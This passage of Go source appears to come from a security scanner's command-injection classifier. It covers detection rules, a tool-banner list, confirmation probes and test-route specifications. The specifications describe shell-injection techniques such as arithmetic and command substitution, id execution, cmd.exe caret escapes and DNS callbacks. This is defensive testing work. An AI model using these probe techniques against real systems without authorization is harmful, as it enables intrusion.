			// These DO carry the answer bytes, on purpose. Clause 3 must suppress them. If the
			// suppression fails the rule has become a substring search.
			if s.marker == "" || !s.obs.Delivered() {
				continue
			}
			want := cmdiAnswerBoth(s.marker)
			if s.probe == cmdiNC3 {
				want = cmdiAnswerSubst(s.marker)
			}
			if _, ok := cmdiInResponseNotInRequest(s.obs, want); ok {
				return true, s.probe
			}
		}
	}
	return false, ""
}

// cmdiInResponseNotInRequest is clause 1 plus clause 3.
func cmdiInResponseNotInRequest(obs triage.Observation, want []byte) (int, bool) {
	if len(want) == 0 {
		return 0, false
	}
	for _, req := range cmdiRequestBytes(obs) {
		if bytes.Contains(req, want) {
			return 0, false
		}
	}
	for _, hay := range cmdiResponseBytes(obs) {
		if i := bytes.Index(hay, want); i >= 0 {
			return i, true
		}
	}
	return 0, false
}

// cmdiResponseBytes is everywhere a shell's output can surface. The body is the usual place, but
// an application that puts the value into a response header or a Location gives the same proof.
func cmdiResponseBytes(obs triage.Observation) [][]byte {
	out := [][]byte{obs.Body}
	for _, h := range obs.RespHeaders {
		out = append(out, []byte(h[1]))
	}
	for _, hop := range obs.RedirectChain {
		out = append(out, []byte(hop.Location))
	}
	return out
}

// cmdiRequestBytes is everywhere our own payload sat. Container is included because it is the
// only field that shows a byte the encoder believed it wrote and the transport dropped.
func cmdiRequestBytes(obs triage.Observation) [][]byte {
	out := [][]byte{
		obs.Payload.Logical, obs.Payload.Wire, obs.Payload.Container,
		obs.ReqBody, []byte(obs.ReqWireURL),
	}
	for _, h := range obs.ReqHeaders {
		out = append(out, []byte(h[1]))
	}
	for _, h := range obs.ReqWireHeaders {
		out = append(out, []byte(h[1]))
	}
	return out
}

func cmdiAnyComputeHit(shots []cmdiShot) bool {
	_, ok := cmdiFirstComputeHit(shots)
	return ok
}

func cmdiFirstComputeHit(shots []cmdiShot) (cmdiHit, bool) {
	var best cmdiHit
	found := false
	for _, s := range shots {
		h, ok := cmdiComputeHit(s)
		if !ok {
			continue
		}
		// Prefer the richest mechanism, so the report says "both" when both fired.
		if !found || cmdiMechanismRank(h.mechanism) > cmdiMechanismRank(best.mechanism) {
			best, found = h, true
		}
	}
	return best, found
}

func cmdiMechanismRank(m string) int {
	switch m {
	case "arithmetic_and_substitution_confirmed":
		return 4
	case "arithmetic_and_substitution":
		return 3
	case "command_substitution":
		return 2
	case "arithmetic_expansion":
		return 1
	}
	return 0
}

// cmdiConfirmedHit reports whether a CONFIRMATION probe fired. It is what separates grade high
// from grade medium: fresh marker and fresh operands, so a body that carried 140004 for its own
// reasons cannot reproduce.
func cmdiConfirmedHit(shots []cmdiShot) (bool, triage.ProbeID) {
	for _, s := range shots {
		if s.probe != cmdiCF1 && s.probe != cmdiCF2 && s.probe != cmdiCF3 && s.probe != cmdiB16 {
			continue
		}
		if _, ok := cmdiComputeHit(s); ok {
			return true, s.probe
		}
		if s.probe == cmdiB16 && cmdiExternalCommandRan(s) {
			return true, s.probe
		}
	}
	return false, ""
}

// cmdiExternalCommandRan is the CMDI-B16 rule: id's output shape, anchored on our own marker.
// It proves a real binary was executed rather than a builtin being emulated by a sandbox.
func cmdiExternalCommandRan(s cmdiShot) bool {
	if s.marker == "" || !s.obs.Delivered() {
		return false
	}
	want := append(cmdiTagPrefix(s.marker), []byte("uid=")...)
	off, ok := cmdiInResponseNotInRequest(s.obs, want)
	if !ok {
		return false
	}
	for _, hay := range cmdiResponseBytes(s.obs) {
		if off+len(want) > len(hay) {
			continue
		}
		tail := hay[off:min(len(hay), off+96)]
		if bytes.Contains(tail, []byte("(")) && bytes.Contains(tail, []byte(")")) {
			return true
		}
	}
	return false
}

// cmdiWindowsExpansion is the C-D3 Windows rule: a cmd.exe variable expanded immediately after
// our own marker. PATHEXT's default value and a drive-lettered working directory are both shapes
// that cmd.exe alone produces, and neither was in the request.
func cmdiWindowsExpansion(s cmdiShot) ([]byte, int, bool) {
	if s.marker == "" || !s.obs.Delivered() {
		return nil, 0, false
	}
	prefix := cmdiTagPrefix(s.marker)
	for _, hay := range cmdiResponseBytes(s.obs) {
		i := bytes.Index(hay, prefix)
		if i < 0 {
			continue
		}
		tail := hay[i+len(prefix) : min(len(hay), i+len(prefix)+64)]
		if bytes.Contains(bytes.ToUpper(tail), []byte(".COM;.EXE")) {
			m := hay[i:min(len(hay), i+len(prefix)+32)]
			if cmdiAbsentFromRequest(s.obs, m) {
				return m, i, true
			}
		}
		if len(tail) >= 3 && cmdiIsASCIILetter(tail[0]) && tail[1] == ':' && tail[2] == '\\' {
			m := hay[i : i+len(prefix)+3]
			if cmdiAbsentFromRequest(s.obs, m) {
				return m, i, true
			}
		}
	}
	return nil, 0, false
}

func cmdiAbsentFromRequest(obs triage.Observation, want []byte) bool {
	for _, req := range cmdiRequestBytes(obs) {
		if bytes.Contains(req, want) {
			return false
		}
	}
	return true
}

func cmdiIsASCIILetter(b byte) bool {
	return (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z')
}

// cmdiToolBanners is the curated C-D3 list for ARGUMENT INJECTION.
//
// IT IS SHORT AND SPECIFIC ON PURPOSE. Argument injection has no computation oracle: the value
// becomes a flag, and the only observable is that the tool printed something it would not
// otherwise print. A generous list would fire on every page containing the word "version", so
// every entry here is a string that a real tool emits and an application almost never writes for
// itself, and every match is additionally required to be ABSENT from the route control at the
// slot's observed value. The verdict it produces is capped at suspicious for the same reason.
var cmdiToolBanners = []string{
	"ImageMagick",
	"GraphicsMagick",
	"ffmpeg version",
	"ffprobe version",
	"GPL Ghostscript",
	"Artifex Software",
	"GNU Wget",
	"libcurl/",
	"wkhtmltopdf",
	"LibreOffice ",
	"ExifTool Version Number",
	"qpdf version",
	"pandoc ",
	"dot - graphviz version",
	"GNU tar",
	"7-Zip",
	"GNU bash, version",
	"xmllint: using libxml",
	"OpenSSL ",
	"git version ",
	"Python 3.",
	"Usage: ",
}

// cmdiToolBanner returns the banner phrase, its offset, and whether the rule fires. The route
// control's own body is subtracted: an application whose every page carries "ImageMagick 7.1.1"
// in a footer must not make every argument-injection probe a finding.
func cmdiToolBanner(body, routeBody []byte) (string, int, bool) {
	lower := bytes.ToLower(body)
	routeLower := bytes.ToLower(routeBody)
	for _, phrase := range cmdiToolBanners {
		p := bytes.ToLower([]byte(phrase))
		i := bytes.Index(lower, p)
		if i < 0 {
			continue
		}
		if bytes.Contains(routeLower, p) {
			continue // in the control too, so it is the application's own prose
		}
		if phrase == "Usage: " && !bytes.Contains(lower, []byte("--help")) && !bytes.Contains(lower, []byte("-h,")) {
			continue // a bare "Usage: " is a web form's own label as often as a tool's
		}
		return phrase, i, true
	}
	return "", 0, false
}

func cmdiIsArgProbe(id triage.ProbeID) bool {
	switch id {
	case cmdiA1, cmdiA2, cmdiA3, cmdiA4, cmdiA5:
		return true
	}
	return false
}

// cmdiEchoAvailable asks whether the computation oracle was structurally available at all: did
// this class's own census probe come back? A no here is the difference between "tested and quiet"
// and "there was nothing to hear".
func cmdiEchoAvailable(shots []cmdiShot) bool {
	for _, s := range shots {
		if s.marker == "" || !s.obs.Delivered() {
			continue
		}
		want := cmdiTagPrefix(s.marker)
		for _, hay := range cmdiResponseBytes(s.obs) {
			if bytes.Contains(hay, want) {
				return true
			}
			if bytes.Contains(bytes.ToLower(hay), bytes.ToLower(want)) {
				return true
			}
		}
		for _, h := range s.obs.Proj.MarkerHits {
			if h.Marker == s.marker {
				return true
			}
		}
	}
	return false
}

// cmdiUniformBlock is the "three of this class's OWN distinct payloads" rule of CATALOGUE 2.1. It
// uses this class's own responses only; a cross-class uniform block is an annotation for the
// operator and contributes to no verdict.
func cmdiUniformBlock(env cmdiEnv, shots []cmdiShot) bool {
	counts := map[string]map[triage.ProbeID]bool{}
	for _, s := range shots {
		if !s.obs.Delivered() {
			continue
		}
		key := cmdiBodyKey(s.obs.Status, s.obs.Proj.NormBodySHA256, s.obs.BodySHA256, s.obs.Body)
		if counts[key] == nil {
			counts[key] = map[triage.ProbeID]bool{}
		}
		counts[key][s.probe] = true
	}
	routeKey := cmdiBodyKey(env.route.status, env.route.sha, [32]byte{}, env.route.body)
	for key, probes := range counts {
		if key == routeKey {
			continue // identical to the control is the opposite of a block
		}
		if len(probes) >= 3 {
			return true
		}
	}
	return false
}

// cmdiFidelity is the guard that stops an integration bug becoming a corpus of clean rows.
//
// It refuses to read a silence as a silence when the probe was never delivered, when the wire
// form was never proven, when the runner did not substitute the marker placeholder, or when it
// did not substitute the observed-value placeholder. Each of those is a bug in the layer around
// this class, and each of them makes every payload inert while leaving the responses looking
// perfectly normal.
func cmdiFidelity(shots []cmdiShot) (string, triage.ProbeID) {
	specs := cmdiSpecIndex()
	for _, s := range shots {
		if !s.obs.Delivered() {
			return cmdiReasonNotDelivered, s.probe
		}
		if s.marker != "" && !s.marker.BelongsTo(triage.ClassCMDI) {
			return cmdiReasonForeignMarker, s.probe
		}
		if spec, ok := specs[s.probe]; ok && bytes.Contains(spec.Logical, []byte(cmdiMark)) && s.marker == "" {
			return cmdiReasonNoMarker, s.probe
		}
		if !s.obs.Payload.Survived.Proven() {
			return cmdiReasonWireUnproven, s.probe
		}
		wire := s.obs.Payload.Wire
		if len(wire) == 0 {
			wire = s.obs.Payload.Container
		}
		if len(wire) == 0 {
			return cmdiReasonWireUnproven, s.probe
		}
		if bytes.Contains(wire, []byte(cmdiMark)) || bytes.Contains(wire, []byte(cmdiObservedValue)) {
			return cmdiReasonPlaceholder, s.probe
		}
	}
	return "", ""
}

func cmdiFidelityDetail(reason string) string {
	switch reason {
	case cmdiReasonNotDelivered:
		return "the transport refused or failed the send, so the application never saw the payload and its silence is the transport's, not the application's"
	case cmdiReasonWireUnproven:
		return "no wire form was recorded for it, so nothing shows the bytes this class asked for are the bytes that went out, and Go's own cookie writer silently drops the semicolon, the double quote and the backslash"
	case cmdiReasonForeignMarker:
		return "its marker's R12 ordinal stripe belongs to another class, so this response is a hit for nobody and reading it here would attribute another class's probe to this one"
	case cmdiReasonNoMarker:
		return "the payload spells the marker placeholder and no marker was minted for it, so the answer string this class looks for can never appear and its silence means nothing"
	case cmdiReasonPlaceholder:
		return "the runner's placeholder is still literally present in the wire form, so the marker or the observed value was never substituted, every payload went out inert, and the answer string this class looks for could never have appeared"
	}
	return reason
}

func cmdiBaselineWhy(b triage.BaselineModel) string {
	if b.Degraded {
		return "a degraded comparison (an oversized, truncated or untokenisable body)"
	}
	if b.GateReason != "" {
		return "the stability gate verdict " + b.GateReason
	}
	return "an unstable endpoint"
}

// cmdiIdentifiedShell and cmdiIdentifiedOS read this class's own identification probes. They
// never produce a verdict; they fill in the hints commix would otherwise spend requests learning.
func cmdiIdentifiedShell(shots []cmdiShot) string {
	for _, s := range shots {
		if s.probe != cmdiS2 && s.probe != cmdiS1 {
			continue
		}
		if s.marker == "" {
			continue
		}
		prefix := cmdiTagPrefix(s.marker)
		for _, hay := range cmdiResponseBytes(s.obs) {
			i := bytes.Index(hay, prefix)
			if i < 0 {
				continue
			}
			tail := string(hay[i+len(prefix) : min(len(hay), i+len(prefix)+24)])
			for _, name := range []string{"bash", "dash", "zsh", "ash", "sh"} {
				if strings.HasPrefix(strings.TrimPrefix(tail, "/bin/"), name) {
					return name
				}
			}
		}
	}
	return ""
}

func cmdiIdentifiedOS(shots []cmdiShot) string {
	for _, s := range shots {
		if s.probe != cmdiS3 || s.marker == "" {
			continue
		}
		prefix := cmdiTagPrefix(s.marker)
		for _, hay := range cmdiResponseBytes(s.obs) {
			i := bytes.Index(hay, prefix)
			if i < 0 {
				continue
			}
			tail := string(hay[i+len(prefix) : min(len(hay), i+len(prefix)+24)])
			for _, name := range []string{"linux-gnu", "linux", "darwin", "freebsd"} {
				if strings.HasPrefix(tail, name) {
					return name
				}
			}
		}
	}
	return ""
}

// cmdiLabel is what this class hands the expensive scanner. commix is the only confirmer in the
// framework's 31 for this class, so the label never defaults to a nearest-named tool.
func cmdiLabel(shell, os string) triage.TriageLabel {
	hints := map[string]string{
		"technique": "classic",
		"operands":  cmdiOperandA + "+" + cmdiOperandB,
	}
	if shell != "" {
		hints["shell"] = shell
	}
	if os != "" {
		hints["os"] = os
	}
	return triage.TriageLabel{Tools: []string{"commix"}, Engine: shell, Hints: hints}
}

// ---------------------------------------------------------------------------------------------
// UNTESTED ROWS, ORDINALS AND VERDICT CONSTRUCTION
// ---------------------------------------------------------------------------------------------

// cmdiRequiredFamilies is the set a clean at this slot depends on: every probe that is
// deliverable here and is not gated behind a hit, a collaborator or the timing preconditions.
//
// The negative controls are IN the set on purpose. A detector whose controls never ran has not
// been shown staying silent at this slot, and a silence from an unverified detector is not a
// measurement.
func cmdiRequiredFamilies(env cmdiEnv) []triage.ProbeID {
	var out []triage.ProbeID
	for _, spec := range (cmdiClassifier{}).Probes() {
		switch spec.ID {
		case cmdiT0, cmdiT2, cmdiT5:
			continue // declared and never planned; the Untested row carries the reason
		case cmdiB16, cmdiS1, cmdiS2, cmdiS3, cmdiCF1, cmdiCF2, cmdiCF3:
			continue // confirmation tier: there is nothing to confirm on a silent slot
		case cmdiDEC:
			continue // sent only when nobody measured the slot's decode depth
		case cmdiO1, cmdiO2, cmdiO3, cmdiO4, cmdiNC5:
			if env.oobMode == triage.OOBNone {
				continue
			}
			if (spec.ID == cmdiO2 || spec.ID == cmdiO3) && env.oobMode != triage.OOBHTTPPath && !env.oobServes {
				continue
			}
		}
		if cmdiUndeliverable(env.slot, spec) != "" {
			continue
		}
		out = append(out, spec.ID)
	}
	return out
}

func cmdiMissingFamilies(env cmdiEnv, shots []cmdiShot) []triage.ProbeID {
	sent := map[triage.ProbeID]bool{}
	for _, s := range shots {
		sent[s.probe] = true
	}
	var out []triage.ProbeID
	for _, id := range cmdiRequiredFamilies(env) {
		if !sent[id] {
			out = append(out, id)
		}
	}
	return out
}

func cmdiNameProbes(ids []triage.ProbeID) string {
	names := make([]string, 0, len(ids))
	for _, id := range ids {
		names = append(names, string(id))
	}
	sort.Strings(names)
	return strings.Join(names, " ")
}

// cmdiUntestedFor names every probe this class did not send at this slot, with its reason. A
// class that quietly sends fewer probes on one slot than another is the shape of a silent zero.
func cmdiUntestedFor(slot triage.Slot, shots []cmdiShot) []triage.ProbeSkip {
	sent := map[triage.ProbeID]bool{}
	for _, s := range shots {
		sent[s.probe] = true
	}
	var out []triage.ProbeSkip
	for _, spec := range (cmdiClassifier{}).Probes() {
		if sent[spec.ID] {
			continue
		}
		reason := cmdiUndeliverable(slot, spec)
		if reason == "" {
			switch spec.ID {
			case cmdiT0, cmdiT2, cmdiT5:
				reason = "timing_declared_never_planned"
			case cmdiB16, cmdiS1, cmdiS2, cmdiS3, cmdiCF1, cmdiCF2, cmdiCF3:
				reason = "confirmation_tier_no_hit_to_confirm"
			case cmdiO1, cmdiO2, cmdiO3, cmdiO4, cmdiNC5:
				reason = "no_collaborator"
			case cmdiDEC:
				reason = "decode_depth_already_measured"
			default:
				reason = "not_reached_in_the_rounds_that_ran"
			}
		}
		out = append(out, triage.ProbeSkip{ProbeID: spec.ID, Reason: reason})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].ProbeID < out[j].ProbeID })
	return out
}

func cmdiSkipIDs(skips []triage.ProbeSkip, of []triage.ProbeID) []string {
	want := map[triage.ProbeID]bool{}
	for _, id := range of {
		want[id] = true
	}
	var out []string
	for _, s := range skips {
		if want[s.ProbeID] {
			out = append(out, string(s.ProbeID))
		}
	}
	sort.Strings(out)
	return out
}

func cmdiOrdinals(shots []cmdiShot) []uint64 {
	out := make([]uint64, 0, len(shots))
	for _, s := range shots {
		out = append(out, s.ordinal)
	}
	sort.Slice(out, func(i, j int) bool { return out[i] < out[j] })
	return out
}

// cmdiOne is the no-probe form: a structural or refusal row, which carries no ordinals because
// nothing was measured, and which can never be clean.
func cmdiOne(key triage.SlotKey, state triage.TriageState, reason, detail string) []triage.ClassVerdict {
	return []triage.ClassVerdict{{
		Class:   triage.ClassCMDI,
		SlotKey: key,
		State:   state,
		Reason:  reason + ": " + detail,
	}}
}

// cmdiOneFull is the measured form. It carries the ordinals and the Untested list, because a
// verdict that asserts something about the application must name the probes behind it.
func cmdiOneFull(key triage.SlotKey, state triage.TriageState, reason, detail string,
	ordinals []uint64, untested []triage.ProbeSkip, ann map[string]any) []triage.ClassVerdict {
	r := detail
	if reason != "" {
		r = reason + ": " + detail
	}
	return []triage.ClassVerdict{{
		Class:       triage.ClassCMDI,
		SlotKey:     key,
		State:       state,
		Reason:      r,
		Ordinals:    ordinals,
		Untested:    untested,
		Annotations: ann,
	}}
}

// ---------------------------------------------------------------------------------------------
// SETTLE, CONFIRMERS, EVIDENCERS, ORACLE CASES
// ---------------------------------------------------------------------------------------------

// Settle is the deferred out-of-band check, and this class genuinely needs one.
//
// A DNS callback from CMDI-O1 can arrive seconds after the last response, well after Classify
// ran. Without a second look the run would record cannot_determine (no_oob_endpoint) on a slot
// that had already proven itself. Settle is Classify over a ctx whose Callbacks set has been
// refilled after OOBConfig.GraceWindow, and it stamps the row so an operator can tell a settled
// verdict from a first-pass one.
func (c cmdiClassifier) Settle(ctx triage.ClassifyCtx) []triage.ClassVerdict {
	out := c.Classify(ctx)
	for i := range out {
		if out[i].Annotations == nil {
			out[i].Annotations = map[string]any{}
		}
		out[i].Annotations["cmdi_settled_after_grace_window"] = true
	}
	return out
}

// cmdiConfirmer is one probe this class sends only to reproduce a hit. The types are local to
// this file because package triage does not declare them; sibling classifiers declare their own.
type cmdiConfirmer struct {
	Probe triage.ProbeID
	For   string
	Why   string
}

// Confirmers is the reproduction set. Every one of them uses a fresh marker, because every
// ProbeRequest gets one, and the arithmetic ones also use fresh operands.
func (cmdiClassifier) Confirmers() []cmdiConfirmer {
	return []cmdiConfirmer{
		{cmdiCF1, "computation",
			"the same shape with operands summing to 102006 instead of 140004. A response that carried 140004 for its own reasons cannot reproduce this, which is what raises the grade from medium to high"},
		{cmdiCF2, "computation, arithmetic alone",
			"separates $(( )) from $( ). commix takes a different technique for each and the operator should not have to find out which by running both"},
		{cmdiCF3, "computation, substitution alone",
			"the other half of the same split, and it is the one that still works where arithmetic expansion has been filtered"},
		{cmdiB16, "a real external binary",
			"id is read-only and proves the shell executed something off disk rather than a WAF sandbox emulating echo. Planned only after a hit, never speculatively"},
		{cmdiNC5, "the out-of-band oracle itself",
			"a bare hostname with no command. If it resolves, every DNS-only callback in this class is evidence about the target's egress and not about a shell"},
		{cmdiS2, "identification",
			"the shell's own name in one token, so the label carries it instead of commix spending requests to learn it"},
	}
}

// cmdiEvidencer declares what this class stores when a rule fires, so the evidence a verdict
// points at is specified rather than improvised at the call site.
type cmdiEvidencer struct {
	Oracle   string
	Rule     string
	Extracts string
	Why      string
}

func (cmdiClassifier) Evidencers() []cmdiEvidencer {
	return []cmdiEvidencer{
		{"computation", "C-D1",
			"the matched answer run, its offset, the probe ordinal and the full PayloadWire",
			"the wire form travels with the match because the whole rule is 'these bytes are in the response and are NOT in the request', and a reader has to be able to check the second half"},
		{"oob", "C-D2",
			"the CallbackRec, its protocol and the probe that carried the label",
			"a callback is only evidence when it can be tied to one of this class's own probes, and the record is what ties it"},
		{"banner", "C-D3 Windows",
			"the marker plus the expanded variable text, and its offset",
			"PATHEXT's default value and a drive-lettered path are shapes only cmd.exe emits, so the bytes themselves are the argument"},
		{"banner", "C-D3 argument injection",
			"the curated phrase, its offset, and the fact that the route control did not contain it",
			"the control's absence is half the rule; storing only the phrase would leave the verdict unreviewable"},
		{"none", "the blind case",
			"no evidence, and an annotation saying the census probe's own marker did not come back",
			"there is nothing to store, and pretending otherwise is how an unmeasured slot acquires a green tick"},
	}
}

// cmdiOracleCase is one route this class needs in docker/oracle, with what it must do there.
type cmdiOracleCase struct {
	Name   string
	Route  string
	Expect string // "positive" or "negative"
	Exists bool
	Probes []triage.ProbeID
	Want   string
}

const (
	cmdiExpectPositive = "positive"
	cmdiExpectNegative = "negative"
)

// OracleCases declares the fire routes and the silent routes. THE SILENT ONES ARE THE TEST: a
// detector that only ever fires scores the same as one that always says yes.
func (cmdiClassifier) OracleCases() []cmdiOracleCase {
	return []cmdiOracleCase{
		{
			Name: "posix_shell_emulator", Route: "/cmdi", Expect: cmdiExpectPositive, Exists: true,
			Probes: []triage.ProbeID{cmdiB1, cmdiB7, cmdiB8, cmdiCF1},
			Want: "emulates echo, expr and id with $(( )), $( ) and backticks. It must NOT echo its " +
				"argument verbatim: an emulator that did would make a genuinely injectable target read clean",
		},
		{
			Name: "posix_substitution_only", Route: "/cmdi/quoted", Expect: cmdiExpectPositive, Exists: false,
			Probes: []triage.ProbeID{cmdiB7, cmdiB8},
			Want: "a CORRECTLY double-quoted shell call, so every separator byte is inert and only the " +
				"empty-separator family fires. This is the route that proves B7 and B8 are not redundant with B1",
		},
		{
			Name: "windows_cmd_emulator", Route: "/cmdi/windows", Expect: cmdiExpectPositive, Exists: false,
			Probes: []triage.ProbeID{cmdiW1, cmdiW2, cmdiW3, cmdiW5, cmdiW6},
			Want: "emulates cmd.exe: set /a, <nul set /p=, %PATHEXT%, %CD%, for /f, and the caret escape " +
				"so se^t runs set. Without it the entire Windows battery and the caret have never been observed firing",
		},
		{
			Name: "argv_sink", Route: "/cmdi/argv", Expect: cmdiExpectPositive, Exists: false,
			Probes: []triage.ProbeID{cmdiA1, cmdiA2, cmdiA3, cmdiA4, cmdiA5},
			Want: "execs a tool with an argv ARRAY and no shell, appending the parameter as one argument, " +
				"and prints the tool's stdout. Every separator probe must stay silent here and only the " +
				"argument-injection family may fire, which is the whole reason that family exists",
		},
		{
			Name: "oob_callback", Route: "/cmdi/blindoob", Expect: cmdiExpectPositive, Exists: false,
			Probes: []triage.ProbeID{cmdiO1, cmdiO2, cmdiO3, cmdiO4},
			Want: "runs the command and discards its output, against a local fake collaborator. The only " +
				"route on which C-D2 can ever be observed firing",
		},
		{
			Name: "reflection_is_not_injection", Route: "/clean/echo", Expect: cmdiExpectNegative, Exists: true,
			Probes: []triage.ProbeID{cmdiB1, cmdiB7, cmdiNC1, cmdiNC2, cmdiNC3, cmdiNC4},
			Want: "reflects the input and runs nothing. Every rule must stay silent, and CMDI-NC2 is the " +
				"one that matters: it hands back the answer string, so a detector without the not-in-the-request " +
				"clause fires here and is broken",
		},
		{
			Name: "no_error_branch", Route: "/clean/always500", Expect: cmdiExpectNegative, Exists: true,
			Probes: []triage.ProbeID{cmdiB1, cmdiB2, cmdiB7},
			Want: "500 for every input including a benign one. This class has NO error branch, so a 500, " +
				"a stack trace and a template exception must all be invisible to it",
		},
		{
			Name: "uniform_block", Route: "/clean/waf", Expect: cmdiExpectNegative, Exists: true,
			Probes: []triage.ProbeID{cmdiB1, cmdiB2, cmdiB3, cmdiA1},
			Want: "an identical 403 for every payload. Must produce cannot_determine (blocked) for the " +
				"metacharacter route AND a separate row for the argument-injection route, never one merged clean",
		},
		{
			Name: "blind_no_collaborator", Route: "/cmdi/blind", Expect: cmdiExpectNegative, Exists: false,
			Probes: []triage.ProbeID{cmdiC0, cmdiB1, cmdiB7},
			Want: "RUNS the command and discards the output, with no collaborator configured and no " +
				"reflection anywhere. The verdict MUST be cannot_determine (no_oob_endpoint). This is the " +
				"route that proves the class refuses to call a genuinely vulnerable blind sink clean",
		},
		{
			Name: "banner_in_the_baseline", Route: "/clean/versionprose", Expect: cmdiExpectNegative, Exists: false,
			Probes: []triage.ProbeID{cmdiA1, cmdiA2, cmdiA3, cmdiA4},
			Want: "every response, the route control included, carries the literal ImageMagick 7.1.1 in a " +
				"footer. The argument-injection rule must subtract the control and stay silent, or every " +
				"application that names its own toolchain becomes a finding",
		},
		{
			Name: "windows_battery_must_not_fire_on_posix", Route: "/cmdi", Expect: cmdiExpectNegative, Exists: true,
			Probes: []triage.ProbeID{cmdiW1, cmdiW3, cmdiW5, cmdiW6},
			Want: "the POSIX emulator must NOT fire the Windows battery and must not emit any banner " +
				"literal, because there are no Windows binaries behind it",
		},
		{
			Name: "egress_resolver", Route: "/cmdi/unfurler", Expect: cmdiExpectNegative, Exists: false,
			Probes: []triage.ProbeID{cmdiNC5, cmdiO1},
			Want: "resolves every hostname-shaped string in any parameter, the way a link unfurler or a " +
				"DLP scanner does, and runs no command. CMDI-NC5 resolves, so the verdict must be " +
				"cannot_determine (egress_resolver) and NOT a finding",
		},
		{
			Name: "empty_body", Route: "/clean/empty204", Expect: cmdiExpectNegative, Exists: true,
			Probes: []triage.ProbeID{cmdiC0, cmdiB1},
			Want: "204 with no body on the baseline and on every probe. The census cannot come back, so " +
				"with no collaborator the verdict must be cannot_determine (no_oob_endpoint), never clean",
		},
	}
}
